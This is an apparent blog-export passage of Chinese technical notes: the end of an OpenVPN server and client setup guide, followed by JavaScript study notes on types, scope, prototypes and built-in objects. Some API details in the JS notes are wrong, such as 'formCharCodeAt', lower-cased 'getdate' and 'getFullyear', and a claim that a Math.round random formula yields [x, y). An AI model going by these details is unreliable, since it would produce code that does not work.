ca：ca.crt、cert：client.crt、key：client.key、tls-auth：ta.key相对于配置文件夹的相对路径。 末尾添加：auth-nocache以避免在内存中缓存认证信息（否则会报 warning）。 末尾添加：redirect-gateway def1 bypass-dhcp，将系统默认路由网关改为 OpenVPN 虚拟对端网卡。 末尾添加：dhcp-option DNS 8.8.8.8，设置连接 OpenVPN 后使用的 DNS 服务器。 在可视化界面中启动服务即可。 Mac 客户端安装软件OpenVPN Connect。 生成密钥文件client.key及证书请求文件client.csr： 12345cd /Applicationscd &quot;OpenVPN Connect&quot;sudo openssl genrsa -out client.key 4096sudo openssl rand -out .rnd 1sudo openssl req -new -key client.key -subj &quot;/C=US/ST=NewYork/L=New York City/O=DigitalOcean/OU=Community/CN=client/emailAddress=admin@example.com&quot; -out client.csr OpenVPN 服务器会将 CN 名作为多个客户端时的区分标志，客户端应各自使用不同的 CN 名。 将client.csr拷贝至 CA 端： 123cd /etc/openvpnrm client.csr vim client.csr 由 CA 端签发证书client.crt： 1sudo openssl x509 -req -days 36500 -CA ca.crt -CAkey ca.key -CAcreateserial -extfile openvpn.cnf -extensions v3_client -in client.csr -out client.crt 将client.crt及ca.crt、ta.key拷贝至客户端，cat查看后直接复制文本内容即可，用sudo vim xx.xxx的格式填入内容： 123cat client.crtcat ca.crtcat ta.key CA 端可清除文件： 1sudo rm client.csr client.crt client 端可清除文件： 1sudo rm client.csr 修改配置文件client.ovpn： 修改 remote 为服务器地址及 port。 修改协议为 UDP。 检查 ca：ca.crt、cert：client.crt、key：client.key、tls-auth：ta.key相对于配置文件夹的相对路径。 末尾添加：auth-nocache以避免在内存中缓存认证信息（否则会报 warning）。 末尾添加：redirect-gateway def1 bypass-dhcp，将系统默认路由网关改为 OpenVPN 虚拟对端网卡。 末尾添加：dhcp-option DNS 8.8.8.8，设置连接 OpenVPN 后使用的 DNS 服务器。 在OpenVPN Connect启动服务。 ios客户端安装软件OpenVPN Connect。 修改配置文件client.ovpn之前的工作和mac客户端完全相同。 修改配置文件client.ovpn： 修改 remote 为服务器地址及 port。 修改协议为 UDP。 在pc端会指定密钥或证书文件 ca：ca.crt、cert：client.crt、key：client.key、tls-auth：ta.key等。但是删除该部分。如果指定了tls-auth ta.key 1，则将其替换为key-direction 1。在删除相关内容后，具体的替换操作如下：12345678910111213&lt;ca&gt;ca.crt文件内容&lt;/ca&gt;&lt;cert&gt;client.crt文件内容&lt;/cert&gt;&lt;key&gt;client.key文件内容&lt;/key&gt;key-direction 1&lt;tls-auth&gt;ta.key文件内容&lt;/tls-auth&gt; 末尾添加：auth-nocache以避免在内存中缓存认证信息（否则会报 warning）。 末尾添加：redirect-gateway def1 bypass-dhcp，将系统默认路由网关改为 OpenVPN 虚拟对端网卡。 末尾添加：dhcp-option DNS 8.8.8.8，设置连接 OpenVPN 后使用的 DNS 服务器。 这是一个去掉无用注释的正确配置文件格式（具体内容可能有所差别）(网上别人给出来的，我实际用的是从mac的配置文件改的，和这个有点区别）： 1234567891011121314151617181920212223242526dev tunproto udpremote 88.88.88.88 1195cipher AES-128-CBCauth SHA1resolv-retry infinitenobindpersist-keypersist-tunclientverb 3&lt;ca&gt;-----BEGIN CERTIFICATE-----0MC2Hb46TpSi125sC8KKfP-----END CERTIFICATE-----&lt;/ca&gt;&lt;cert&gt;-----BEGIN CERTIFICATE-----+mZhYPGRKXKSJI6s0Egg/Cri+Cwk4bjJfrb5-----END CERTIFICATE-----&lt;/cert&gt;&lt;key&gt;-----BEGIN RSA PRIVATE KEY-----wmE9Mmlbq1emDeROivjCfoG-----END RSA PRIVATE KEY-----&lt;/key&gt; 在OpenVPN Connect启动服务。 使用系统服务开机自启开机自启脚本/etc/init.d/openvpn会扫描/etc/openvpn/xxx.conf并为每个配置文件启动一个同名的 openvpn@xxx 系统服务。可编辑/etc/default/openvpn文件的 AUTOSTART 项，选择性地开启配置自启。 客户端 IP 分配服务端配置文件的 ifconfig-pool-persist 项设置了客户端 IP 持久化记录文件，默认为/var/log/openvpn/ipp.txt，但此文件仅用于 OpenVPN 自己回写动态分配给各客户端的 IP，并不应通过该文件配置。正确方法是为服务端配置文件添加 client-config-dir ccd，然后新建/etc/openvpn/ccd客户端静态 IP 配置文件夹，在其中新建以客户端 CN 命名的配置文件。 12345cd /etc/openvpnsudo mkdir ccdsudo cat &lt;&lt;EOF | sudo tee ccd/clientifconfig-push 10.8.0.5 10.8.0.6EOF 其中 ifconfig-push 第一个参数为分配给客户端的 IP，第二个参数为隧道对端 IP。为了与 Windows 客户端的 TAP-Windows 驱动兼容，两 IP 应位于统一/30子网，且各客户端应分属不同/30子网，例如此处 IP 为10.8.0.5 10.8.0.6，下个客户端 IP 就至少为10.8.0.9 10.8.0.10。 客户端互访注释掉服务端配置文件的 client-to-client，即可实现连接到同一 OpenVPN 服务端的客户端通过 VPN IP 互访。 参考资料 OpenVPN 官网 OpenSSL 添加 x509 扩展 OpenVPN KeyUsage 扩展 https://superuser.com/questions/738612/openssl-ca-keyusage-extension/)","categories":[{"name":"vpn","slug":"vpn","permalink":"https://avalooooooon.github.io/categories/vpn/"}],"tags":[{"name":"vpn","slug":"vpn","permalink":"https://avalooooooon.github.io/tags/vpn/"}]},{"title":"JS笔记","slug":"JS笔记","date":"2022-01-17T11:45:34.000Z","updated":"2022-01-17T11:45:34.000Z","comments":true,"path":"2022/01/17/JS笔记/","link":"","permalink":"https://avalooooooon.github.io/2022/01/17/JS%E7%AC%94%E8%AE%B0/","excerpt":"","text":"Chrome内运行 开发者工具-&gt;Console 窗口调试 JavaScript 代码 开发者工具-&gt;Sources-&gt;Snippets选项卡-&gt; Creat new snippet 来新建一个脚本文件 JS没有任何打印或者输出的函数，只能：使用 window.alert() 弹出警告框；document.write() 方法将内容写到 HTML 文档中；innerHTML 写入到 HTML 元素； console.log() 写入到浏览器的控制台。 使用 document.getElementById(id) 方法：使用 “id” 属性来标识&#x2F;查找 HTML 元素，并 innerHTML 来获取或插入元素内容。使用方法如下，先id1234567891011下面是几个例子：```javascriptconsole.time(&quot;计时器的名字&quot;);console.timeEnd(&quot;计时器的名字&quot;); console.log();document.write(); // 实际上是通过超文本标记语言(html)输出。比如想换行，document.write(1+&quot;\\n&quot;)不行，document.write(1+&quot;&lt;br /&gt;&quot;)才行。var year = prompt(&quot;请输入年份&quot;); //prompt()：弹出一个带文本框的提示框,需要字符串做参数做为提示文字。注意返回类型为String。Math.sqrt(i); //开方 数据类型基本数据类型：String Number Boolean Null Undefined引用数据类型：Object 主要区别：基本数据类型在栈中保存的是值，引用数据类型在栈中保存的是地址。 使用typeof a查看a的数据类型。转义字符：\\。\\n :换行 \\t:制表符 \\\\:斜杠“\\”。 在字符串中使用转义字符输出Unicode编码：\\u四位编码，如console.log(&quot;\\u2620&quot;)。注意这里的四位编码是16进制。在网页中使用Unicode编码：&amp;#十进制编码，如&lt;p&gt;&amp;#9760;&lt;/p&gt;。 String：双引号和单引号都行，但不要混用；可以使用\\作为转义字符 引号需要成对出现，不能嵌套！ Number：包括整数和浮点数。 NaN：特殊的数字，表示Not a Number Number.MAX_VALUE：最大数。比它大就是Infinity，都是字面量。 Number.MIN_VALUE：最小正数。 运算：整数基本保证精确。浮点元素运算可能不精确。 千万别用JS进行对精确度要求高的运算！ Boolean Null：专门表示一个为空的对象。使用typeof检查时返回object。 Undefined：声明了但没赋值的变量。使用typeof检查时返回undefined。 强制类型转换类型转换主要指将其他数据类型转换为String Number Boolean。 转换为String： 调用被转换数据类型的toString()方法：a = a.toString()。null和undefined没有toString()方法。 调用String()函数：a = String(a)。 toString()方法和String()函数都不会影响原变量，返回的只是转换结果。 转换为Number： Number()函数：a = Number(a)。字符串类型有非数字的转为NaN，空串或者全是空格转为0。Undefined类型、object类型结果为NaN。Null类型结果为0。 局限：对于a = 123px，想要进行a + 10这类情景不友好。 一种专门解决字符串的方法函数parseInt()：将一个字符串中的 有效 整数拿出。可以用来取整。函数parseFloat()：将一个字符串中的 有效 小数拿出。如果是非String，会转换成string再处理。 可以在parseInt()中传递第二个参数指定进制：parseInt(a,10) 转换为Boolean：Boolean()函数 数字：除了0和NaN都是true；字符串：除了空串都是true；null和undefined都是false 总之，除了0、-0、NaN、‘’、null和Undefined都为true。 可以对任意数据类型取反两次转换为Boolean:a = !!a。!!是一种强制类型转换，作用为把变量转换成“等价”的布尔值。 引用数据类型 栈内存和堆内存 栈内存：JS中的变量都保存到栈内存，基本数据类型的值直接在栈内存中存储。值与值之间独立存在，修改一个变量不会影响其他变量。 堆内存：JS中的对象都保存到堆内存，每创建一个新的对象就会在堆内存中创建一个新的空间。这种情况下变量保存的是对象的内存地址（对象的引用）。如果两个变量保存的是同一个对象引用，则当一个通过一个变量修改属性时，另一个也会受到影响。如果直接修改变量的值，比如obj2 = null，那么obj不受影响。 当比较两个基本数据类型的值时，就是比较值；但两个引用数据类型比较的是对象的内存地址。 作用域全局作用域全局作用域在页面打开时创建，在页面关闭时销毁。直接编写在script标签中的JS代码都在全局作用域。全局作用域中有一个全局对象window，它由浏览器创建，代表浏览器窗口，我们可以直接使用。全局作用域中创建的变量都会作为window对象的属性保存，创建的函数都会作为window对象的方法保存。全局作用域中的变量都是全局变量，在页面的任意部分都可以访问到。 函数作用域调用函数时创建函数作用域，函数执行完毕以后函数作用域销毁。每调用一次函数就会创建一个新的函数作用域，他们之间互相独立。当在函数作用域操作变量时，会优先在自身作用域中寻找，如果有就直接使用。如果自身作用域没有，按照就近原则使用上级作用域中的同名变量。如果全局作用域中依然没有就会报错。要在函数中精确访问全局变量可以使用window对象。 定义形参就相当于在函数作用域中声明了变量。函数中定义形参a就相当于var一个a。 在函数中，不使用var声明的变量都会成为全局变量！前提是这个函数先被调用了。 变量和函数的声明提前（提升）变量的声明提前：使用var关键字声明的变量，会在所有代码执行之前被声明（但不会赋值，使用的时候再复制），也就是预编译先找到var a，让变量a=undefined。但如果声明变量不是用的var关键字，则变量就不会被声明提前。 函数的声明提前：使用函数声明形式创建的函数function 函数()&#123;&#125;会在所有的代码执行之前就被创建，所以我们可以在函数声明前就调用函数。这样的函数声明写在哪里都一样。但使用函数表达式创建的函数var 函数名 = function()&#123;&#125;不会被声明提前，所以不能在声明前调用。因为根据变量的声明提前原理，由于使用了var关键字，所以函数名被赋值为undefined，只有在使用时才会被赋予具体值。 在函数作用域中也有声明提前的特性，使用var关键字声明的变量会在函数中所有代码执行之前被声明。使用函数声明形式创建的函数也会在函数中所有的代码执行之前执行。 this解释器在调用函数每次都会向函数内部传递一个隐含参数，这个隐含的参数就是this。this指向的是一个对象，该对象称为函数执行的上下文对象。根据函数 调用方式 的不同，this会指向不同的对象： 以函数形式调用时，this永远都是window 以方法形式调用时，this就是调用方法的对象 以构造函数形式调用时，this就是新创建的对象 在事件的响应函数中，响应函数是给谁绑定的this就是谁 总之就是this指向当前调用函数的对象。 运算任何数和NaN运算的结果都是NaN。除拼串，对任何非Number的值会转换成Number。 算术运算 +：对几个字符串使用是拼串操作。var a = &quot;123&quot;+&quot;456&quot;，结果为123456。事实上，任何值和字符串相加都会转换成字符串并进行拼串操作。 隐式类型转换：可以利用这一特点将一个任意数据类型转换为String，只需要任意的数据类型 + 一个””即可：a = a + &#39;&#39;。 - * &#x2F;：除了“ + ”的其他运算符号（- * &#x2F;），在算式中出现的变量都会转化成数字再计算。 隐式类型转换：可以利用这一特点将一个任意数据类型转换为Number，只需要任意的数据类型 -0;*1;/1即可。原理和Number()一样，使用更简单。 一元运算符：全换为Number类型再运算。+ -, 正号” + “不会对数字产生任何影响, 负号“-”可以对数字进行符号取反。 隐式类型转换：可以利用这一特点将一个任意数据类型转换为Number，只需要任意的数据类型 a = +a即可。如a = 1 + +a + 2。 逻辑运算JS中的&amp;&amp; 和 || 是短路与&#x2F;或而不是逻辑与&#x2F;或。对于非布尔值：会先将其转换为布尔值再运算，并且 返回原值 。 &amp;&amp;：两值运算，若第一个为true，返回第二个值；第一个为false，直接返回第一个值。 ||：两值运算，若第一个为true，直接返回第一个值；第一个为false，返回第二个值。 == 和 !=：（不）相等运算。若两个值类型不同，会转化成相同类型再比较，大部分情况是转化为数字。 Undefined衍生自null，所以这两个值作相等判断时会返回true NaN不和包括它本身任何值相等。可以通过isNaN()函数判断一个值是否为NaN。 === 和 !==：（不）全等运算。和相等的区别在于它不会做类型转换。若类型不同直接返回。 关系运算指&gt; &gt;= &lt; &lt;= =。会转化成数字再比较。任何值和NaN比较都是false。 若比较符号的两侧都是字符串，不会转换为数字，而会分别比较字符串中的 Unicode编码，一位一位比较，两位一样就比下一位。如果比较两个字符类型的数字时，可能得到不可预期的结果。所以比较两个字符串类型的数字时，一定要转型。可以利用该特性对英文排序。 条件运算语法：条件表达式？语句1:语句2。先执行条件运算符，判断执行语句1还是2，并返回执行结果。若条件表达式的结果是非布尔值，会将其转化为布尔值再运算。 函数和代码块调用函数时 解释器不会检查实参的类型 ，实参可以是任意数据类型。所以要注意如果有可能接收到非法的参数就需要对参数进行类型检查。同样， 解释器不会检查实参的数量 ，多余实参不会被赋值，如果实参数量少，则没有对应实参的形参将是undefined。 普通函数和箭头函数两种写法分别为data:function()&#123;&#125;和 data:()=&gt;&#123;&#125;。一般在对象里写方式会删掉function，删掉冒号：data()&#123;&#125;区别：箭头函数没有自己的this，只会向外找，找到的是window。 函数中的return在函数中，return后可以跟任意类型的值。return后的语句都不会执行；如果return语句后不跟任何值或者函数中不写return就相当于返回一个undefined。 注意my fun()和fun的区别： fun()```：是调用函数，相当于使用了函数 **返回值**123456789101112131415&gt;```myfun```：是函数对象，相当于直接使用了函数 **对象** ### 函数声明、立即执行函数和代码块使用**函数声明**或**函数表达式**来创建函数：```javascript// 函数声明function 函数名(形参1,形参2,...,形参n)&#123; 语句...&#125;// 函数表达式：创建一个匿名函数,再将这个匿名函数对象赋值给一个变量// 此时，语句本质上是一个赋值语句，因此最好在末尾加分号。var 函数名 = function(形参1,形参2,...,形参n)&#123; 语句...&#125;; 使用 立即执行函数 使函数定义完立即被调用。立即执行函数往往只会执行一次。 12345(function(a,b)&#123; // 如果外围不加括号，解释器会将大括号中的内容识别为一个代码块而无视前面的声明 console.log(&quot;a=&quot; + a); console.log(&quot;b=&quot; + b);&#125;)(123,456) 一个&#123;&#125;中的内容称为一个代码块，一个代码块中的内容要么都执行，要么都不执行。 JS中的代码块 只有分组作用！块中的内容块外也完全可见，并不隔离。 条件判断&#x2F;条件分支&#x2F;switch&#x2F;for语句12345678910111213141516171819202122// if语句if(条件表达式)&#123; 语句... &#125;else if&#123; 语句... &#125;else&#123; 语句... &#125;// switch语句。依次将case后的表达式和switch后的条件表达式进行全等比较。switch(条件表达式)&#123; case 表达式； 语句... break; default: 语句... break;&#125;// while。判断一次执行一次。可以使用break终止循环。while(条件表达式)&#123; 语句... &#125;// do...while。执行一次判断一次。也就是while先判断再执行，do...while先执行再判断。do...while可以保证循环体至少执行一次。do&#123; 语句... &#125;while(条件表达式)// for语句。for(初始化表达式；条件表达式；更新表达式)&#123; &#125; break和continue（和return）可以为循环语句加上一个label标识当前循环。比如创建一个label为outer的循环：outer:循环语句 break outer：结束循环。立即终止label&#x3D;outer的循环。默认终止本 层 循环。 只能对循环和switch语句使用! continue outer：跳过当 次 循环，继续下一次循环。其它和break一样。 return：结束整个函数。 函数的方法：call()和apply()——修改函数对象的this这两个方法都是函数对象的方法，需要通过函数对象（不加()）来调用。当对函数调用call()和apply()时都会使函数执行。在调用call()和apply()时，可以将一个对象指定为第一个参数，此时这个对象将会成为函数执行时的this。 call()方法可以将实参在对象后依次传递：fun.call(obj,3,4) // a=3，b=4apply()方法需要将实参封装到一个数组中统一传递：fun.apply(obj,[3,4]) // a=3，b=4 arguments在调用函数时，浏览器每次都会传递进两个隐含的参数：函数的上下文对象this和封装 实参 的对象arguments。arguments是一个类数组对象，它也可以通过索引来操作数据，也可以获取长度。在调用函数时我们传递的实参都会在arguments中保存，arguments.length可以用来获取实参的长度。即使不定义形参也可以通过arguments来使用实参，只不过比较麻烦；arguments[0]表示第一个实参，以此类推。 不管定不定义形参，实参都会在arguments中保存！ 123456function fun()&#123; console.log(arguments); // [object arguments] // 是类数组对象，不是数组对象 console.log(arguments instanceof Array); // false console.log(Array.isArray(arguments)); // false&#125; 另外，arguments里面还有一个属性叫callee，这个属性对应一个函数对象，就是当前正在指向的函数对象。 数组也是对象，不同的是普通对象使用字符串作为属性名，数组使用数字作为索引操作元素。数组的存储性能比普通对象好，在开发中经常使用数组来存储一些数据。 123456789101112131415// 可以在创建时就指定数组中的元素。使用```typeof```检查数组时返回object。// 创建数组对象————使用构造函数和使用字面量创建数组：var arr = new Array(1,20,30); // 只传一个正整数时创建的是长度为指定值的空数组。var arr1 = [1，2，3，10]; // 常用// 向数组中添加元素。语法：数组[索引] = 值// 读取数组中的元素：数组[索引]。如果读取不存在的索引返回undefined。arr[0]=10;// 获取数组长度。对于连续数组返回元素个数，非连续数组返回最大索引 + 1。console.log(arr.length);// 修改length。修改的length大于原长，多出的部分会空出来；小于时多出的元素会被删除。arr.length = 5;// 技巧：向数组的最后添加元素arr[arr.length] = 66; 数组的遍历通常都是用for循环。 JS还提供了一个方法：forEach()。需要注意该方法只支持IE8以上的浏览器。forEach()方法需要一个函数作为参数，通常不会为了它去专门创建一个全局变量，而是使用匿名函数（像这种函数，由我们创建但不是由我们调用的，称为回调函数。）。 数组中有几个元素就会执行几次，每次执行时浏览器会将遍历到的元素以实参的形式传递进来，我们可以定义形参来读取这些内容。浏览器会在回调函数中传递三个参数：第一个是当前正在遍历的元素，第二个是当前正在遍历的元素的索引，第三个是当前正在遍历的数组。 1arr.forEach(function(value,index,obj)&#123; &#125;) 增减开头&#x2F;末尾元素：push()和pop() unshift()和shift()push()方法向数组的末尾添加一个或多个元素，可以将要添加的元素作为方法的参数传递，这样这些元素将会自动添加到数组的末尾。同时将新数组的长度作为返回值返回。pop()方法删除数组的最后一个元素，同时将被删除的元素作为返回值返回。 unshift()方法向数组开头添加一个或多个元素，同时将新数组的长度作为返回值返回。向前面插入元素后，其他元素的索引会依次调整。shift()方法删除数组的第一个元素，同时将被删除的元素作为返回值返回。 提取元素：slice() splice()slice()方法用来从数组中提取指定元素。该方法不会改变原数组，而是将截取到的元素封装到一个新数组中返回。参数：1.截取开始的位置的索引；2.截取结束的位置的索引（左闭右开）。索引可以传递一个负值，表示从后往前计算（-1是倒数第一个，-2倒数第二个）。第二个参数可以省略不写，此时会截取从开始索引往后的所有元素。 splice()用来从数组中删除（并替换&#x2F;插入）指定元素。该方法会改变原数组：将指定元素从原数组中删除，并将被删除的元素作为返回值返回。参数：1.截取开始的位置的索引（包含）；2.删除的数量；3.第三个及以后的参数可以传递新元素，将它们按顺序插入到开始位置索引的前面。 连接数组：concat()concat()方法用来连接两个或多个数组，该方法不会影响原数组，并将新数组返回。 转换为字符串：join()join()方法用来将数组转换为一个字符串，该方法不会影响原数组，并将转换后的字符串作为结果返回。可以指定一个字符串作为参数，这个字符串将会成为数组中元素的连接符。如果不指定则默认使用逗号作为连接符。 反转数组：reverse()reverse()方法用来反转数组，该方法会直接修改原数组。 排序：sort()sort()方法用来对数组中的元素进行排序，该方法会直接修改原数组。默认按照Unicode编码进行排序。即使对纯数字数组，sort()方法也会按照Unicode编码进行排序。所以对数字排序时可能会得到错误结果。 浏览器不同可能导致结果相反 可以在sort()中添加一个回调函数指定排序规则。回调函数需要定义两个形参，浏览器将会分别使用数组中的元素作为实参去调用回调函数，使用哪个元素调用不确定，但肯定的是在数组中a一定在b前面，浏览器会根据回调函数的返回值决定元素的顺序，如果返回一个大于0的值，则元素会交换位置；返回一个小于或等于零的值，元素位置不变。如果需要升序排列，返回a-b；如果需要降序排列，返回b-a。 1arr.sort(function(a,b)&#123; return a-b;&#125;) // 升序排列 对象 内建对象：由ES标准中定义的对象。在任何ES的实现中均可使用。如Math String Number Boolean Function Object 宿主对象：由JS的运行环境提供的对象。主要指由浏览器创造的对象。如BOM（浏览器对象模型） DOM（文档对象模型）。console、document也属于这一类。 自建对象：由开发人员自己创建。 属性名和属性值是名值对。名与值之间使用 : 连接，多个名值对之间使用 , 隔开。对象中的最后一个属性之后不要写 ‘, ’。读取对象中的属性值可以使用对象.属性名的方式。 读取对象中没有的属性，不会报错而是会返回undefined。如果使用了特殊的属性名，需要用对象[&quot;属性名&quot;] = 属性值的方式操作。中括号[ ]的特点就是可以传递一个变量。 使用[ ]操作对象更加灵活。在[ ]中可以直接传递一个变量，这样变量值是多少，就会读取变量值那个属性： 比如var n = &quot;hi&quot;; obj[n]=&quot;你好&quot;; console.log(obj[n]);就会输出“你好”。 删除属性：delete 对象.属性名。 使用in检查对象中是否含有某个属性时，如果对象中没有但原型中有，也会返回true。 可以使用对象的hasOwnProperty()方法检查对象自身中是否含有该属性，只有当对象自身含有属性时才会返回true。 方法如果一个函数作为对象的属性保存，我们称这个函数为对象的方法。 使用for ... in语句枚举对象中的属性。对象中有几个属性循环体就执行几次。每次执行时，会将对象中的一个属性的 名字 赋值给变量。语法：for(变量 in 对象)&#123;&#125;。 1234for(var n in obj)&#123; console.log(“属性名” + n); // 属性名：name 属性名：age console.log(“属性值” + obj[n]); // 属性值：Bob 属性值：18&#125; 使用工厂方法创建对象：可以大批量地创建对象，尤其是具有相同属性名、不同属性值的。1234567891011121314function createPerson(name,age,gender)&#123; // 创建一个新的对象 var obj = new Object(); // 向对象中添加属性 obj.name = name; obj.age = age; obj.gender = gender; obj.sayName = function()&#123; alert(this.name); &#125;; // 将新的对象返回 return obj;&#125;var obj2 = createPerson(&quot;张三&quot;，18，“男”)； 构造函数使用工厂方法创造的对象使用的构造函数都是Object，所以创建的对象都是Object这个类型，导致无法区分多种不同类型的对象。 构造函数就是一个普通函数，创建方式和普通函数一样，不同的是构造函数习惯首字母大写。构造函数和普通函数的区别：调用方式不同。普通函数是直接调用，而构造函数需要使用new关键字调用。 使用同一个构造函数创建对象称为一类对象，也将一个构造函数称为一个类。将通过同一个构造函数创建的对象称为该类的实例。使用instanceof可以检查一个对象是否是一个类的实例，语法：对象 instanceof 构造函数。如果是，返回true，否则返回false。 所有对象都是Object的后代，因此任何对象和Object做instanceof检查时都会返回true。 12345678910function Person(name,age)&#123; this.name = name; this.age = age; this.sayName = function()&#123; alert(this.name); &#125;&#125;var per = new Person(&quot;Bob&quot;,18);per.sayName();console.log(per.sayName); 构造函数的执行流程： 立刻 创建一个新的函数对象。一出现new，就会在堆内存开辟出一个新的内存空间。这片空间保存Person()函数中的内容。 将新建的对象设置为构造函数中的this。在构造函数中可以使用this来引用新建的对象。也就是新开辟出的堆内存空间的地址赋值给变量per，this保存着per的地址，指向per这块对象内存。(this 是保存在栈中的, 执行构造函数的时候, this也保存了那片区域的地址) 逐行执行函数中的代码。（只有这一步是我们写的，其他都是浏览器干的） 将新建的对象作为返回值返回。 垃圾回收（Garbage Collection，GC）当一个对象没有任何的变量或属性对它进行引用，将永远无法操作该对象，这种对象就是垃圾，存在过多会占用大量的内存空间，必须进行清理。 JS中有自动的垃圾回收机制，会自动将这些垃圾对象从内存中销毁，我们不需要也不能进行垃圾回收的操作。我们需要做的只是要将不再使用的对象设置为null。 原型对象在上面的Person()构造函数中为每一个对象都添加了一个sayName方法，而且这个方法是在构造函数内部创建的，也就是构造函数每执行一次就会创建一个新的sayName方法，（说到底每次执行构造函数在堆空间中开辟的内存都不同），也就是所有实例的sayName都是唯一的。如果像这样将sayName方法在全局作用域中定义（这里叫它fun）：function fun()&#123;alert(this.name);&#125;，则会污染全局作用域的命名空间，而且定义在全局作用域中也很不安全。 显式原型prototype和隐式原型__proto__显式原型（函数）：我们所创建的每一个函数，解析器都会向函数中添加一个属性prototype（例外：通过Function.prototype.bind方法构造出来的函数没有prototype属性）。这个属性指向函数的原型对象。其主要作用是实现基于原型的继承与属性的共享。隐式原型（实例）：可以通过__proto__（两边都是两个下划线）访问对象的内置属性prototype。其主要作用是构成原型链，同样用于实现基于原型的继承。比如访问obj对象中的x属性时，如果在obj中找不到就会沿着__proto__依次查找。__proto__指向创建这个对象的函数的显式原型。 显式原型prototype和隐式原型__proto__的区别在于，prototype是构造函数的属性，而__proto__是对象的属性。无论是函数身上的显式原型属性，还是实例身上的隐式原型属性，它们都指向了同一个对象：原型对象。通过显式原型链给原型(或者原型的原型)添加属性，通过隐式原型链获取原型的属性，从自身沿着原型链一直找直到window的原型为空。 实例的隐式原型属性，永远指向自己缔造者的原型对象！ 如果函数作为普通函数调用，prototype没有任何作用；当函数以构造函数的形式调用时，它所创建的对象中都有一个隐含的属性指向该构造函数的原型对象。也就是构造函数.prototype == 所有该构造函数的实例._proto_。 原型对象就相当于一个公共的区域，所有一个类的实例都可以访问到这个原型对象。我们可以将对象中共有的内容统一设置到原型对象中。当我们访问对象的一个属性或方法时，它会先在对象自身中寻找，如果没有则会去原型对象中寻找，找到了就直接使用。 以后我们创建构造函数时可以将这些对象共有的属性和方法统一添加到构造函数的原型对象中，这样不用为每一个对象添加，也不会影响到全局作用域，就可以使每个对象都具有这些属性和方法了。 123456789// 向Person的原型中添加属性aPerson.prototype.a = 123;// 向Person的原型中添加一个方法Person.prototype.sayName = function()&#123; alert(this.name);&#125;var per = new Person(&quot;Bob&quot;,18)per.sayName(); 原型对象的原型原型对象也是对象，所以它也有原型。当我们使用一个对象的属性或方法时，会先在自身中寻找，自身中如果有，则直接使用；如果没有则去原型对象中寻找，如果原型对象中有，则使用；如果没有则去原型的原型中寻找。直到找到Object对象的原型————虽然Object对象的原型没有原型，但它也有一个__proto__属性，这个属性对应的值就是null。如果在Object中依然没有找到，则该对象.属性返回undefined。（null是没找到原型，undefined是没找到原型的属性） 在看原型链时，只要看到toString()方法，就证明这个已经到了Object的原型对象。 123456789// 原型。实例._proto_=构造函数.prototype，即Person的prototypeconsole.log(per.__proto__);// 原型的原型。Person.prototype的_proto_，是Object的prototypeconsole.log(per.__proto__.__proto__); //[Object Object]console.log(per.__proto__.__proto__.hasOwnProperty(&quot;hasOwnProperty&quot;)); //true// 原型的原型的原型。Object的原型没有原型。console.log(per.__proto__.__proto__.__proto__); // null toString()当我们直接在页面中打印一个对象时（console.log)，实际上是输出的对象的toString()方法的返回值。如果我们希望在输出对象时不输出[Object Object]，可以为对象（或原型）添加一个toString()方法。 把prototype写在构造方法前面才能覆盖toString()方法！ 123456789// 它们的输出都是[Object Object]（除了Chrome）console.log(per);console.log(per.toString());// 修改per对象原型的toStringPerson.prototype.toString = function()&#123; return &quot;Person[name=&quot; + this.name + &quot;,age=&quot; + this.gender + &quot;]&quot;;&#125;console.log(per); // 现在的输出是&quot;Person[name=Bob,age=18]&quot; Date对象使用var d = new Date()创建Date对象。如果直接使用构造函数创建一个Date对象，则会封装为当前代码执行的时间使用var d2 = new Date(月/日/年 时：分：秒)创建指定时间的Date对象。需要在构造函数中传递一个表示时间的字符串作为参数。 getdate()，getday()，getmonth()，getFullyear()使用getdate()获取当前日期对象的日是多少，getFullyear()同理。getday()获取当前日期对象是周几。getmonth()获取当前日期对象的月份，返回一个0-11的值，0表示一月。 时间戳：getTime()和Date.now()使用getTime()获取当前日期对象的时间戳，即从格林威治标准时间的1970年1月1日0时0分0秒到当前日期所花费的毫秒数。 时区不同，计算结果也不同。在CN，1970年1月1日0时0分0秒的时间戳并不为0。计算机底层在保存时间时使用的都是时间戳。 使用Date.now()获取当前时间的时间戳。 Math对象Math和其他的对象不同，它不是一个构造函数！它属于工具类，不用创建对象，它里面封装了数学运算相关的属性和方法。 123456789Math.ceil() // 向上取整Math.floor() // 向下取整Math.round() // 四舍五入取整Math.random() // 生成[0，1)的随机数，可以乘x生成[0，x)的随机数Math.round(Math.random()*(y-x)+x) // 生成[x，y )的随机数Math.pow(x,y) // 返回x的y次幂Math.sqrt() // 返回平方根 包装类JS中提供了三个包装类，可以将基本数据类型的数据转换为对象。 String()：可以将基本数据类型的字符串转换为String对象 Number()：可以将基本数据类型的字符串转换为Number对象 Boolean()：可以将基本数据类型的字符串转换为Boolean对象 但是注意，实际应用中不会使用基本数据类型的对象（如var num = new Number(3)），因为使用它们可能在比较时带来不可预期的结果。 方法和属性只能添加给对象，不能添加给基本数据类型。但var s = 10;s = s.toString();s.hello = &quot;11&quot;不会报错，原因在于当我们对一些基本数据类型的值去调用属性和方法时，浏览器会临时使用包装类将其转换为对象，再调用对象的属性和方法。调用完后还是基本数据类型。 String对象的相关方法字符串在底层是以字符数组的形式保存的。比如它也有length属性，可以用来获取字符串的长度。 除非特殊说明，字符串的大部分方法都不会改变原字符串。 charAt()：根据索引返回字符串中指定位置的字符。作用同中括号[ ]。 charCodeAt()：获取指定位置字符的Unicode编码。 formCharCodeAt()：根据字符编码去获取字符。需要用构造函数去调用：String.formCharCodeAt()。 concat()：连接两个或多个字符串，作用同加号。 indexOf()：检索一个字符串中是否含有指定内容。如果含有该内容，会将其第一次出现的索引作为返回值返回。如果没找到则返回-1。可以指定第二个参数指定开始查找的位置。 lastIndexOf()：用法同上，不同的是上一个从前往后，这个从后往前找。返回最后出现的下标。也可以指定开始查找的位置。 slice()：从字符串截取指定内容并将截取到的内容返回。第一个参数是开始位置的索引，第二个是结束位置的索引，左闭右开。省略第二个参数就会截取后面所有的。传递负数将会从后边计算，-1是倒数第一个，以此类推。 subString()：和slice()完全一样，不同的是这个方法不能接受负值作为参数，如果传了负值自动按0处理，而且他还自动调整参数的位置，如果第二个参数小于第一个就自动交换。 split()：将字符串拆分为数组。需要一个字符串作为参数，将会根据该字符串去拆分数组。如果传递空串作为参数，则会将每个字符都拆分为数组中的一个元素。 正则表达式 一些处理常见任务的正则表达式可以直接去网上搜索。 正则表达式（reg，Regular 